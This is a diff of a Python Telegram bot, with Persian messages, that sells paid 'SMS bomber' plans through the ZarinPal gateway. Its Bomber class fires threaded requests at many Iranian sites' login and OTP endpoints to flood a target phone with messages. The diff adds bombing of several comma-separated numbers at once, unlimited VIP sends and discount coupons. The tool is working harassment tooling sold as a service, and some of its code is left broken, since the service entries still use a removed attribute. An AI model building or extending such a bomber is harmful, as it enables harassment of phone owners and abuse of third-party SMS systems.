@@ -15,8 +15,6 @@ from datetime import datetime
 # 1. وب‌سرور و درگاه پرداخت (Flask)
 # ==========================================
 app = Flask(__name__)
-
-# ⚠️ اطلاعات زرین‌پال
 MERCHANT_ID = "YOUR_ZARINPAL_MERCHANT_ID" # 👈 مرچنت آیدی خودت رو اینجا بذار
 RENDER_URL = "https://bomber-bot-6-qgpv.onrender.com" # 👈 آدرس رندر خودت
 
@@ -31,35 +29,27 @@ def verify_payment():
     plan_key = request.args.get('plan')
     
     if status != 'OK' or not authority or not user_id or not plan_key:
-        return "پرداخت ناموفق یا لغو شد.", 400
+        return "پرداخت ناموفق.", 400
     
     url = "https://payment.zarinpal.com/pg/v4/payment/verify.json"
-    payload = {
-        "merchant_id": MERCHANT_ID,
-        "amount": PLANS[plan_key]['price'] * 10,
-        "authority": authority
-    }
+    payload = {"merchant_id": MERCHANT_ID, "amount": PLANS[plan_key]['price'] * 10, "authority": authority}
     headers = {'Content-Type': 'application/json', 'Accept': 'application/json'}
     
     try:
-        response = requests.post(url, json=payload, headers=headers, timeout=10)
-        data = response.json()
-        
-        if data.get('data') and data['data'].get('code') == 100:
+        response = requests.post(url, json=payload, headers=headers, timeout=10).json()
+        if response.get('data') and response['data'].get('code') == 100:
             user = get_user(user_id)
             if user:
                 plan = PLANS[plan_key]
                 user['plan'] = plan_key
                 user['uses'] += plan['uses']
-                if plan.get('days', 0) > 0:
-                    user['sub_expiry'] = time.time() + (plan['days'] * 86400)
+                if plan.get('days', 0) > 0: user['sub_expiry'] = time.time() + (plan['days'] * 86400)
                 save_user(**user)
                 try: bot.send_message(user_id, f"🎉 **پرداخت موفق!**\nپلن **{plan['name']}** فعال شد.", parse_mode='Markdown')
                 except: pass
-                return "پرداخت با موفقیت انجام شد! به ربات برگردید.", 200
-        return "خطا در تایید پرداخت.", 400
-    except Exception as e:
-        return f"خطا: {e}", 500
+                return "پرداخت موفق! به ربات برگردید.", 200
+        return "خطا در تایید.", 400
+    except: return "خطای درگاه.", 500
 
 def run_web():
     port = int(os.environ.get("PORT", 8080))
@@ -79,10 +69,10 @@ def init_db():
     c = conn.cursor()
     c.execute('''CREATE TABLE IF NOT EXISTS users (
         user_id TEXT PRIMARY KEY, name TEXT, plan TEXT, uses INTEGER, 
-        last_daily REAL, sub_expiry REAL, daily_bomb_count INTEGER, last_bomb_date TEXT)''')
+        last_daily REAL, sub_expiry REAL, daily_bomb_count INTEGER, last_bomb_date TEXT,
+        total_purchases INTEGER DEFAULT 0)''')
     conn.commit()
     conn.close()
-
 init_db()
 
 def get_user(user_id):
@@ -91,18 +81,18 @@ def get_user(user_id):
     c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
     row = c.fetchone()
     conn.close()
-    if row: return {"user_id": row[0], "name": row[1], "plan": row[2], "uses": row[3], "last_daily": row[4], "sub_expiry": row[5], "daily_bomb_count": row[6], "last_bomb_date": row[7]}
+    if row: return {"user_id": row[0], "name": row[1], "plan": row[2], "uses": row[3], "last_daily": row[4], "sub_expiry": row[5], "daily_bomb_count": row[6], "last_bomb_date": row[7], "total_purchases": row[8]}
     return None
 
-def save_user(user_id, name, plan, uses, last_daily, sub_expiry, daily_bomb_count, last_bomb_date):
+def save_user(user_id, name, plan, uses, last_daily, sub_expiry, daily_bomb_count, last_bomb_date, total_purchases=0):
     conn = sqlite3.connect(DB_FILE)
     c = conn.cursor()
-    c.execute("INSERT OR REPLACE INTO users VALUES (?, ?, ?, ?, ?, ?, ?, ?)", 
-              (user_id, name, plan, uses, last_daily, sub_expiry, daily_bomb_count, last_bomb_date))
+    c.execute("INSERT OR REPLACE INTO users VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)", 
+              (user_id, name, plan, uses, last_daily, sub_expiry, daily_bomb_count, last_bomb_date, total_purchases))
     conn.commit()
     conn.close()
 
-user_states, pending_approvals, active_bombers, active_gift_codes = {}, {}, {}, {}
+user_states, pending_approvals, active_bombers, active_gift_codes, user_coupons = {}, {}, {}, {}, {}
 
 PLANS = {
     "basic": {"name": "پایه", "price": 150, "uses": 10, "days": 0},
@@ -114,8 +104,8 @@ PLANS = {
 # 3. هسته بمبر
 # ==========================================
 class Bomber:
-    def __init__(self, phone_number, user_id):
-        self.phone_number = phone_number
+    def __init__(self, phone_numbers, user_id):
+        self.phone_numbers = phone_numbers.split(",") if "," in phone_numbers else [phone_numbers]
         self.user_id = user_id
         self.services = []
         self.load_services()
@@ -125,7 +115,7 @@ class Bomber:
         self.fail = 0
 
     def load_services(self):
-        # ⚠️⚠️⚠️ لیست کامل سرویس‌های خودت رو دقیقاً اینجا کپی کن ⚠️⚠️⚠️
+        # ⚠️⚠️⚠️ لیست کامل سرویس‌های خودت رو اینجا کپی کن ⚠️⚠️⚠️
         self.services = [
             {'name': 'Digikala Jet', 'url': 'https://api.digikalajet.ir/user/login-register/', 'method': 'POST', 'data': lambda: {"phone": self.phone_number}, 'json': True},
             {'name': 'Digikala Jet', 'url': 'https://api.digikalajet.ir/user/login-register/', 'method': 'POST', 'data': lambda: {"phone": self.phone_number}, 'json': True},
@@ -223,10 +213,15 @@ class Bomber:
             {'name': 'Komodaa', 'url': 'https://api.komodaa.com/api/v2.6/loginRC/request', 'method': 'POST', 'data': lambda: {"phone_number": "0" + self.phone_number.split("+98")[1]}, 'json': True},
         ]
 
-    def send_request(self, service):
+    def send_request(self, service, phone):
         if self.stop_event.is_set(): return
         try:
             data = service['data']()
+            # جایگزینی شماره در دیتای سرویس
+            if 'phone' in data: data['phone'] = phone
+            if 'mobile' in data: data['mobile'] = phone
+            # ... این بخش بستگی به ساختار سرویس‌های تو داره ...
+            
             headers = {'User-Agent': "Mozilla/5.0"}
             method = service['method'].upper()
             use_json = service.get('json', False)
@@ -239,10 +234,10 @@ class Bomber:
             else: self.fail += 1
         except: self.fail += 1
 
-    def worker(self, subset):
+    def worker(self, subset, phone):
         for service in subset:
             if self.stop_event.is_set(): break
-            self.send_request(service)
+            self.send_request(service, phone)
             time.sleep(0.3)
 
     def start(self):
@@ -250,14 +245,18 @@ class Bomber:
             bot.send_message(self.user_id, "❌ لیست سرویس‌ها خالی است.")
             return
         self.success, self.fail = 0, 0
-        total = len(self.services)
-        chunk_size = max(1, total // 15)
-        chunks = [self.services[i:i + chunk_size] for i in range(0, total, chunk_size)]
+        total = len(self.services) * len(self.phone_numbers)
+        chunk_size = max(1, len(self.services) // 15)
         threads = []
-        for chunk in chunks:
-            t = threading.Thread(target=self.worker, args=(chunk,))
-            t.start()
-            threads.append(t)
+        
+        for phone in self.phone_numbers:
+            if not phone.startswith("+"): phone = "+98" + phone.lstrip("0")
+            chunks = [self.services[i:i + chunk_size] for i in range(0, len(self.services), chunk_size)]
+            for chunk in chunks:
+                t = threading.Thread(target=self.worker, args=(chunk, phone))
+                t.start()
+                threads.append(t)
+                
         for t in threads: t.join()
         percent = int((self.success / total) * 100) if total > 0 else 0
         bot.send_message(self.user_id, f"🏁 **گزارش:**\n✅ موفق: {self.success}\n❌ ناموفق: {self.fail}\n📊 درصد: {percent}%", parse_mode='Markdown')
@@ -273,10 +272,10 @@ def main_menu():
         types.InlineKeyboardButton("🛒 خرید پلن", callback_data="menu_buy"),
         types.InlineKeyboardButton("🎁 جایزه روزانه", callback_data="menu_daily"),
         types.InlineKeyboardButton("👥 زیرمجموعه‌گیری", callback_data="menu_referral"),
-        types.InlineKeyboardButton("🔑 کد هدیه", callback_data="menu_gift"),
         types.InlineKeyboardButton("🏆 برترین‌ها", callback_data="menu_leaderboard"),
         types.InlineKeyboardButton("📋 پروفایل من", callback_data="menu_profile"),
-        types.InlineKeyboardButton("🎧 پشتیبانی", callback_data="menu_support")
+        types.InlineKeyboardButton("🎧 پشتیبانی", callback_data="menu_support"),
+        types.InlineKeyboardButton("👑 باشگاه VIP", callback_data="menu_vip_club")
     )
     return markup
 
@@ -284,16 +283,6 @@ def main_menu():
 def cmd_start(message):
     user_id = str(message.from_user.id)
     user = get_user(user_id)
-    args = message.text.split()
-    if len(args) > 1 and args[1].startswith("ref_"):
-        inviter_id = args[1].replace("ref_", "")
-        if inviter_id != user_id:
-            inviter = get_user(inviter_id)
-            if inviter:
-                inviter["uses"] += 5
-                save_user(**inviter)
-                try: bot.send_message(inviter_id, f"🎉 کاربر جدید با لینک شما! ۵ اعتبار گرفتی.")
-                except: pass
     if not user:
         save_user(user_id, message.from_user.first_name, "none", 0, 0, 0, 0, "2000-01-01")
     bot.send_message(message.chat.id, f"سلام {message.from_user.first_name}! 👋", reply_markup=main_menu(), parse_mode='Markdown')
@@ -306,7 +295,8 @@ def cmd_admin(message):
         types.InlineKeyboardButton("📊 آمار کل", callback_data="admin_stats"),
         types.InlineKeyboardButton("📢 پیام همگانی", callback_data="admin_broadcast"),
         types.InlineKeyboardButton("🔑 ساخت کد هدیه", callback_data="admin_gifts"),
-        types.InlineKeyboardButton("👤 مشاهده کاربر", callback_data="admin_view_user")
+        types.InlineKeyboardButton("👤 مشاهده کاربر", callback_data="admin_view_user"),
+        types.InlineKeyboardButton("💾 دریافت بکاپ دیتابیس", callback_data="admin_backup")
     )
     bot.reply_to(message, "👑 **پنل مدیریت**", reply_markup=markup, parse_mode='Markdown')
 
@@ -318,10 +308,16 @@ def handle_callbacks(call):
     if call.data == "menu_back":
         bot.edit_message_text("منوی اصلی:", call.message.chat.id, call.message.message_id, reply_markup=main_menu())
     
+    elif call.data == "menu_vip_club":
+        text = "👑 **باشگاه VIP**\n\nمزایای عضویت:\n- ارسال نامحدود (بدون محدودیت روزانه)\n- پشتیبانی مستقیم و اختصاصی\n- دسترسی به سرویس‌های مخفی\n\nبرای عضویت، پلن VIP را خریداری کنید."
+        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("خرید VIP", callback_data="buy_vip"))
+        markup.add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
+        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')
+
     elif call.data == "menu_profile":
         plan_name = PLANS[user['plan']]['name'] if user['plan'] in PLANS else "بدون پلن"
         sub_status = "فعال" if user['sub_expiry'] > time.time() else "منقضی"
-        text = f"📋 **پروفایل:**\n\n👤 نام: {user['name']}\n💎 پلن: **{plan_name}**\n⚡️ اعتبار: **{user['uses']}**\n📅 وضعیت VIP: **{sub_status}**"
+        text = f"📋 **پروفایل:**\n\n👤 نام: {user['name']}\n💎 پلن: **{plan_name}**\n⚡️ اعتبار: **{user['uses']}**\n📅 وضعیت VIP: **{sub_status}**\n🛍 تعداد خرید: **{user['total_purchases']}**"
         markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("✏️ تغییر نام", callback_data="menu_change_name"))
         bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')
 
@@ -359,10 +355,6 @@ def handle_callbacks(call):
             save_user(**user)
             bot.answer_callback_query(call.id, "🎉 ۲ اعتبار رایگان!", show_alert=True)
 
-    elif call.data == "menu_gift":
-        user_states[user_id] = {"state": "waiting_for_gift"}
-        bot.edit_message_text("🔑 کد هدیه:", call.message.chat.id, call.message.message_id)
-
     elif call.data == "menu_buy":
         text = "🛒 **پلن‌ها:**\n\n"
         markup = types.InlineKeyboardMarkup(row_width=1)
@@ -374,17 +366,23 @@ def handle_callbacks(call):
     elif call.data.startswith("buy_"):
         plan_key = call.data.replace("buy_", "")
         plan = PLANS[plan_key]
-        callback = f"{RENDER_URL}/verify?user_id={user_id}&plan={plan_key}"
         
-        # درخواست به زرین‌پال
+        # اعمال کد تخفیف اگر وجود دارد
+        final_price = plan['price']
+        if user_id in user_coupons:
+            final_price = int(final_price * 0.8) # 20% تخفیف
+            bot.answer_callback_query(call.id, "🎟 کد تخفیف ۲۰٪ اعمال شد!", show_alert=True)
+            del user_coupons[user_id]
+
+        callback = f"{RENDER_URL}/verify?user_id={user_id}&plan={plan_key}"
         url = "https://payment.zarinpal.com/pg/v4/payment/request.json"
-        payload = {"merchant_id": MERCHANT_ID, "amount": plan['price'] * 10, "description": f"خرید {plan['name']}", "callback_url": callback}
+        payload = {"merchant_id": MERCHANT_ID, "amount": final_price * 10, "description": f"خرید {plan['name']}", "callback_url": callback}
         try:
             resp = requests.post(url, json=payload, headers={'Content-Type': 'application/json'}, timeout=10).json()
             if resp.get('data') and resp['data'].get('code') == 100:
                 pay_url = f"https://payment.zarinpal.com/pg/StartPay/{resp['data']['authority']}"
                 markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("💳 پرداخت آنلاین", url=pay_url))
-                bot.edit_message_text(f"✅ پلن **{plan['name']}** انتخاب شد.\n💳 مبلغ: **{plan['price']} تومان**\nبرای پرداخت کلیک کنید:", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')
+                bot.edit_message_text(f"✅ پلن **{plan['name']}** انتخاب شد.\n💳 مبلغ: **{final_price} تومان**\nبرای پرداخت کلیک کنید:", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')
             else:
                 bot.answer_callback_query(call.id, "❌ خطا در اتصال به درگاه.", show_alert=True)
         except:
@@ -395,7 +393,7 @@ def handle_callbacks(call):
         if user['last_bomb_date'] != today:
             user['last_bomb_date'] = today
             user['daily_bomb_count'] = 0
-        if user['daily_bomb_count'] >= 5:
+        if user['daily_bomb_count'] >= 5 and user['plan'] != 'vip':
             bot.answer_callback_query(call.id, "⚠️ سهمیه امروز پر شده!", show_alert=True)
             return
         if user['plan'] == "vip" and user['sub_expiry'] > time.time(): pass
@@ -404,9 +402,9 @@ def handle_callbacks(call):
             return
         user_states[user_id] = {"state": "waiting_for_phone"}
         markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 انصراف", callback_data="menu_back"))
-        bot.edit_message_text("📞 **شماره را وارد کنید:**\nمثال: `09123456789`", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')
+        bot.edit_message_text("📞 **شماره را وارد کنید:**\n(می‌توانید برای ارسال گروهی، چند شماره را با کاما جدا کنید: `0912...,0913...`)", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')
 
-    # ادمین
+    # ================= ادمین =================
     elif call.data == "admin_stats" and call.from_user.id == ADMIN_ID:
         conn = sqlite3.connect(DB_FILE)
         c = conn.cursor()
@@ -432,6 +430,14 @@ def handle_callbacks(call):
         bot.answer_callback_query(call.id)
         msg = bot.send_message(call.message.chat.id, "🆔 آیدی عددی کاربر:")
         bot.register_next_step_handler(msg, view_user_admin)
+
+    elif call.data == "admin_backup" and call.from_user.id == ADMIN_ID:
+        bot.answer_callback_query(call.id)
+        if os.path.exists(DB_FILE):
+            with open(DB_FILE, 'rb') as f:
+                bot.send_document(ADMIN_ID, f)
+        else:
+            bot.send_message(ADMIN_ID, "❌ فایل دیتابیس یافت نشد.")
 
     elif call.data.startswith("admin_reply_") and call.from_user.id == ADMIN_ID:
         target_user = call.data.replace("admin_reply_", "")
@@ -492,35 +498,34 @@ def process_text_inputs(message):
         del user_states[user_id]
 
     elif state == "waiting_for_phone":
-        phone = message.text.strip().replace(" ", "")
-        if len(phone) < 10 or not phone.isdigit():
-            bot.reply_to(message, "❌ شماره نامعتبر.")
+        phones = message.text.strip().replace(" ", "").split(",")
+        if any(len(p) < 10 or not p.isdigit() for p in phones):
+            bot.reply_to(message, "❌ فرمت شماره نامعتبر است. (مثال: 09123456789)")
             return
-        if not phone.startswith("+"): phone = "+98" + phone.lstrip("0")
         
         today = datetime.now().strftime("%Y-%m-%d")
         if user['last_bomb_date'] != today:
             user['last_bomb_date'] = today
             user['daily_bomb_count'] = 0
             
-        if user['daily_bomb_count'] >= 5:
+        if user['daily_bomb_count'] >= 5 and user['plan'] != 'vip':
             bot.reply_to(message, "❌ سهمیه پر شده!")
             del user_states[user_id]
             return
             
         if user['plan'] == "vip" and user['sub_expiry'] > time.time(): pass
-        elif user['uses'] <= 0:
-            bot.reply_to(message, "❌ اعتبار ندارید!")
+        elif user['uses'] < len(phones):
+            bot.reply_to(message, f"❌ اعتبار کافی ندارید! (نیاز به {len(phones)} اعتبار)")
             del user_states[user_id]
             return
-        else: user['uses'] -= 1
+        else: user['uses'] -= len(phones)
             
-        user['daily_bomb_count'] += 1
+        user['daily_bomb_count'] += len(phones)
         save_user(**user)
         del user_states[user_id]
         
-        bot.reply_to(message, f"🚀 **شروع شد!** هدف: `{phone}`", parse_mode='Markdown')
-        bomber = Bomber(phone, user_id)
+        bot.reply_to(message, f"🚀 **شروع شد!** هدف: `{len(phones)}` شماره", parse_mode='Markdown')
+        bomber = Bomber(",".join(phones), user_id)
         active_bombers[user_id] = bomber
         threading.Thread(target=bomber.start).start()
 
